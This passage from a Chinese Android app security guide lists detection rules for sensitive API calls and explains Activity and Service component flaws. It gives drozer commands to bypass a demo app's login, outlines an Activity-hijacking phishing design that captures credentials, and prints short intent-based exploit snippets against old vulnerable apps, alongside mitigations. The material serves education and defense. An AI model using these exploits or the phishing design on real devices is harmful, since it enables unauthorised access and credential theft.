<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;su&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure>
<h3 id="获取IMEI-和Device-ID敏感信息代码检测">获取IMEI 和Device ID敏感信息代码检测</h3>
<p>检查app是否有执行获取IMEI和Device ID敏感信息的代码。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>Java代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm <span class="operator">=</span> (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String DEVICE_ID <span class="operator">=</span> tm.getDeviceId()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;tm&quot;</span>:<span class="class">Landroid/telephony/TelephonyManager;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroid/telephony/TelephonyManager;</span>-&gt;getDeviceId()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.local</span> v0, <span class="string">&quot;DEVICE_ID&quot;</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">return-void</span><br></pre></td></tr></table></figure>
<h3 id="获取Android-ID敏感信息代码检测">获取Android ID敏感信息代码检测</h3>
<p>检查app是否有执行获取Android ID敏感信息的代码。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>Java代码</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.provider.Settings.Secure;</span><br><span class="line"><span class="type">String</span> androidId = Secure.<span class="built_in">getString</span>(<span class="built_in">getContentResolver</span>(), Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">Lcom/bug/sensitive/func/MainActivity;</span>-&gt;getContentResolver()<span class="class">Landroid/content/ContentResolver;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v1, <span class="string">&quot;android_id&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/provider/Settings$Secure;</span></span><br><span class="line">-&gt;getString(<span class="class">Landroid/content/ContentResolver;</span><span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br></pre></td></tr></table></figure>
<h3 id="发送SMS敏感代码检测">发送SMS敏感代码检测</h3>
<p>检查app是否有调用发送SMS函数。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>Java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsManager</span> <span class="variable">smsm</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">smsm.sendTextMessage(<span class="string">&quot;123123&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendDataMessage(<span class="string">&quot;13123&quot;</span>, <span class="string">&quot;123&quot;</span>, (<span class="type">short</span>) <span class="number">90</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendMultimediaMessage(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h3 id="文件删除代码检测">文件删除代码检测</h3>
<p>检测app是否有调用删除文件的代码</p>
<p>**风险等级：**提醒</p>
<p><strong>问题示例</strong></p>
<p>Java代码</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;tmp.doc&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> deleted = <span class="keyword">file</span>.<span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure>
<p>上述代码反编译后的Dalvik/ART代码为</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v2, <span class="string">&quot;tmp.doc&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/io/File;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 55</span><br><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;file&quot;</span>:<span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/io/File;</span>-&gt;delete()Z</span><br></pre></td></tr></table></figure>
<h3 id="signature代码检测">signature代码检测</h3>
<p>检查app是否有调用获取signature的代码。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>Java代码</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pkgManager = <span class="built_in">context</span>.getPackageManager();</span><br><span class="line"><span class="keyword">byte[] </span>signature = pkgManager.getPackageInfo(</span><br><span class="line">    <span class="built_in">context</span>.getPackageName(),</span><br><span class="line">    PackageManager.GET_SIGNATURES).signatures[<span class="number">0</span>].toByteArray(); </span><br></pre></td></tr></table></figure>
<p>上述代码反编译后的Dalvik/ART代码</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move-result-object v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">iget-object </span>v2, v0, <span class="class">Landroid/content/pm/PackageInfo;</span>-&gt;signatures:[<span class="class">Landroid/content/pm/Signature;</span></span><br></pre></td></tr></table></figure>
<h2 id="系统漏洞检测">系统漏洞检测</h2>
<h1>APP一些漏洞原理</h1>
<h2 id="Activity组件的相关漏洞">Activity组件的相关漏洞</h2>
<p><strong>(1) Activity漏洞种类</strong></p>
<ul>
<li>越权绕过</li>
<li>钓鱼欺诈/Activity劫持</li>
<li>隐私启动intent包含敏感信息</li>
<li>拒绝服务攻击</li>
</ul>
<p><strong>(2) Activity安全场景和危害</strong></p>
<p>Activity的组件导出，一般会导致的问题Android Browser Intent Scheme URLs的攻击手段</p>
<ul>
<li>拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验</li>
<li>越权攻击：Activity用户界面绕过会造成用户信息窃取，Activity界面被劫持产生欺诈等安全事件</li>
<li>组件导出导致钓鱼欺诈</li>
<li>隐式启动Intent包含敏感数据</li>
</ul>
<h3 id="Activity漏洞原理分析和复现">Activity漏洞原理分析和复现</h3>
<h4 id="越权绕过"><strong>越权绕过</strong></h4>
<p><strong>原理分析</strong>：</p>
<p>在Android系统中，Activity默认是不导出的，如果设置了exported <code>=` `&quot;true&quot;` `这样的关键值或者是添加了&lt;intent</code>-<code>filter</code>&gt;这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</p>
<p><strong>漏洞复现</strong></p>
<p>附件：sieve.apk</p>
<p>使用drozer进行分析</p>
<p>打开这个demo，发现需要输入账号和密码才能进入下一个Activity，我们才是越权绕过这个<code>密码验证</code>界面。</p>
<ul>
<li>
<p>查找该app包名 <code>run app.package.list</code></p>
</li>
<li>
<p>查询目标应用的攻击面，知道有三个Activity是被导出的<br>
<code>run app.package.attacksurface com.mwr.example.sieve</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240921212645899.png" alt="image-20240921212645899"></p>
</li>
<li>
<p>继续查询暴露的Activity信息<br>
<code>run app.activity.info -a com.mwr.example.sieve</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240921212828487.png" alt="image-20240921212828487"></p>
</li>
<li>
<p>说明可以进行Activity相互越权</p>
<p><code>run app.activity.start --component  com.mwr.example.sieve com.mwr.example.sieve.PWList</code></p>
</li>
</ul>
<p><strong>防护策略</strong></p>
<ul>
<li>私有Activity不应该被其他应用启动相对是安全的，创建Activity时，设置exported属性为false</li>
<li>公开暴露的Activity组件，可以被任意应用启动，创建Activity：设置export属性为true，谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理</li>
</ul>
<h4 id="钓鱼欺诈-Activity劫持">钓鱼欺诈/Activity劫持</h4>
<p><strong>原理介绍</strong></p>
<p>​         Activity app中不同界面的切换通过activity的调度来实现，而activity的调度是由Activity系统中的AMS来实现的。每个应用想要启动或者停止一个进程，都报告给AMS。AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。</p>
<p>​        由于Activity的这种特性，如果在启动一个activity时，给他加入一个标签FLAG_ACTIVITY_NEW_TASK，就会使他置于栈顶让他立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有webview加载，允许加载任意网页都有可能产生钓鱼事件。</p>
<p><strong>实现原理：</strong><br>
如果我们注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；这个service，会启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，截获正常应用的登录凭证</p>
<p><strong>实现步骤：</strong><br>
(<code>1</code>)启动一个服务<br>
(<code>2</code>)不断扫描当前进程<br>
(<code>3</code>)找到目标后弹出伪装窗口</p>
<p><strong>安全防护</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;true&quot;</span><span class="string">``</span>时上面的方法也无效</span><br><span class="line">目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。</span><br><span class="line">梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。</span><br></pre></td></tr></table></figure>
<h4 id="隐私启动Intent包含敏感数据">隐私启动Intent包含敏感数据</h4>
<p><strong>原理介绍</strong></p>
<p>介绍原理之前先熟悉一下Intent的隐式和显式两种</p>
<ul>
<li>
<p>显式方法<br>
<code>Intent intent = new Intent(MainActivit.this, NewActivity.class)</code></p>
</li>
<li>
<p>隐式方法</p>
<p>一般用于不同应用程序之间的数据传送</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原理介绍：有一个应用A，采用Intent隐式传递，他的动作是&quot;x&quot;，此时还有一个应用B，动作也是X，我们在启动的时候，通过隐式Intent传递，就会出现两个界面，我们不知道到底启动A还是B</p>
<p>因为现在这种漏洞在Android版本更新后，基本很少出现了，所以这里就不做复现和安全防护了</p>
<h4 id="拒绝服务攻击">拒绝服务攻击</h4>
<p><strong>原理介绍</strong></p>
<p>​        拒绝服务攻击源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用程序发送此类空数据，异常或者畸形数据来达到使该应用crash的目的，我们可以通过intent发送空数据，异常或者畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用攻击，使得自己的应用崩溃造成破坏。</p>
<p>​        危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的</p>
<p><strong>安全防护</strong></p>
<h5 id="Android外部程序的调用方法">Android外部程序的调用方法</h5>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.使用自定义的Action</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//A程翠中调用代码为：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.test.action.PLAYER&quot;</span>);              </span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序中的AndroidManifest.xml中启动Activity的intent-filter</span></span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">                  &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">                   &lt;action android:name=<span class="string">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class="line">                   &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">                       &lt;!--必须，否则无效--&gt;</span><br><span class="line">                  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用包类名</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//A程序中调用的代码：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intetn</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用ComponentName</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">comp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">intent.setComponent(comp);</span><br><span class="line">startActivity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：</span></span><br><span class="line">      &lt;intent-filter&gt;</span><br><span class="line">          &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">      	  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">      &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">1</span><span class="string">``</span>）空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">2</span><span class="string">``</span>）谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<span class="string">``</span><span class="keyword">try</span><span class="string">``</span>/<span class="string">``</span><span class="keyword">catch</span>处理，以及对不符合预期数据做异常处理</span><br><span class="line">总结：</span><br><span class="line"><span class="number">1.</span><span class="string">``</span>不需要被外部调用的activity设置android:exported<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;false&quot;</span><span class="string">``</span>；</span><br></pre></td></tr></table></figure>
<p><strong>安全防护</strong>：</p>
<p>​	(1)空指针异常，类型转换异常，数组越界访问异常，类未定义异常，其他异常</p>
<p>​    (2)谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<code>try/catch</code>处理，以及对不符合预期数据做异常处理</p>
<p>总结：</p>
<p>1.不需要被外部调用的activity设置android:exported<code>=</code>“false”；</p>
<p>2.若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；</p>
<p>3.注册的组件请严格校验输入参数，注意空值判定和类型转换判断</p>
<h2 id="Service组件相关漏洞">Service组件相关漏洞</h2>
<h3 id="service基本介绍">service基本介绍</h3>
<p><strong>步骤</strong>：</p>
<ul>
<li>​	创建一个service服务</li>
<li>我们重写服务中的三大方法onCreate()，onStartCommand()，onDestory()</li>
</ul>
<p><strong>详解</strong></p>
<ul>
<li>onCreate()方法会在服务创建的时候调用</li>
<li>onStartCommand()方法会在每次服务启动的时候调用，通常我们希望服务在开启立刻执行某个动作就会在onStartCommand()里</li>
<li>onDestroy()会在服务销毁的时候调用</li>
</ul>
<h3 id="service启动">service启动</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240922163909306.png" alt="image-20240922163909306"></p>
<p><strong>启动方式</strong></p>
<ul>
<li>startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致activity结束而Service还运行</li>
<li>bindService：该方法启动的服务还可以进行通信，启动的Service可以有unbindService来结束，也可以在activity结束之后自动结束</li>
<li>startService 同时也 bindService 启动的服务：停止服务应同时使用stopService和unbindService</li>
</ul>
<p><strong>StartService</strong></p>
<p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">显示启动：</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">隐式启动：</span><br><span class="line">(<span class="number">1</span>) 使用Action </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//service中定义的action</span></span><br><span class="line">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) 使用包名启动</span><br><span class="line"><span class="type">IntenComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);<span class="type">t</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br></pre></td></tr></table></figure>
<h3 id="bindService启动">bindService启动</h3>
<p>我们要实现服务或活动之间的通讯，我们要使用bind通信机制</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理解析</span><br><span class="line">（<span class="number">1</span>）bindService启动的服务和调用者是典型的<span class="keyword">client</span>-service模式。调用者是<span class="keyword">client</span>，service是service端，service只有一个，但是绑定到service上的<span class="keyword">client</span>可以有一个或者多个</span><br><span class="line">（<span class="number">2</span>）<span class="keyword">client</span>可以通过IBinder接口获取Service实例，从而实现在<span class="keyword">client</span>端直接调用service，可以灵活交互</span><br><span class="line">（<span class="number">3</span>）bindService启动的服务的生命周期与绑定的<span class="keyword">client</span>息息相关，当<span class="keyword">client</span>销毁时，解除绑定，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure>
<p><strong>实现步骤</strong></p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">（<span class="number">1</span>）定义一个类继承Service</span><br><span class="line">（<span class="number">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class="line">（<span class="number">3</span>）在service中创建binder的内部类，加入类似getService()方法返回Service，这样绑定的<span class="keyword">client</span>就可以通过getService()方法获得Service实例了</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">（<span class="number">1</span>）在Manifest中配置Service</span><br><span class="line">（<span class="number">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class="line">（<span class="number">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现<span class="keyword">client</span>与Service的连接</span><br><span class="line">（<span class="number">4</span>）onServiceDisconnected回调被执行时，表示<span class="keyword">client</span>与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class="line">（<span class="number">5</span>）通过Intent 启动服务Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.<span class="keyword">class</span>);</span><br><span class="line">（<span class="number">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class="built_in">int</span>)方法启动该Service</span><br><span class="line">（<span class="number">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure>
<h3 id="Service漏洞原理分析">Service漏洞原理分析</h3>
<p><strong>漏洞种类</strong></p>
<ul>
<li>权限提升</li>
<li>service劫持</li>
<li>消息伪造</li>
<li>拒绝服务</li>
</ul>
<p>如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</p>
<h4 id="权限提升">权限提升</h4>
<p><strong>原理介绍</strong></p>
<p>当一个service配置了 intent-filter 默认是被导出的，如果没有对调用Service进行权限限制或者没有对调用者的身份进行有效验证，那么恶意构造的app都可以对此Service传入恰当的参数进行调用，导致恶意行为发生。</p>
<p><strong>漏洞复现</strong></p>
<p>案例1 <a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p>
<p>漏洞描述：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师（原金山清理大师）``<span class="number">4.0</span>``.``<span class="number">1</span>``及以下版本存在权限泄漏漏洞，泄露的权限为android<span class="selector-class">.permission</span>.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class="line">猎豹清理大师暴露了com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.WidgetService服务组件（详见下图），当向此服务发送action为com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bbs.kanxue.com/upload/attach/202109/905443_UNDUAUVQQNFQGW6.png" alt="image-20210908160946499"></p>
<p><strong>攻击代码：</strong></p>
<p>使用intent，开启service服务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
<p>案例二：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p>
<p><strong>漏洞描述</strong>：</p>
<p>乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</p>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure>
<h4 id="service劫持">service劫持</h4>
<p><strong>攻击原理</strong>：隐式启动service，当存在同名service时，先安装应用的service优先级高</p>
<h4 id="消息伪造">消息伪造</h4>
<p><strong>原理介绍</strong>：</p>
<p>暴露的service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</p>
<p><strong>漏洞复现</strong></p>
<p>案例：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p>
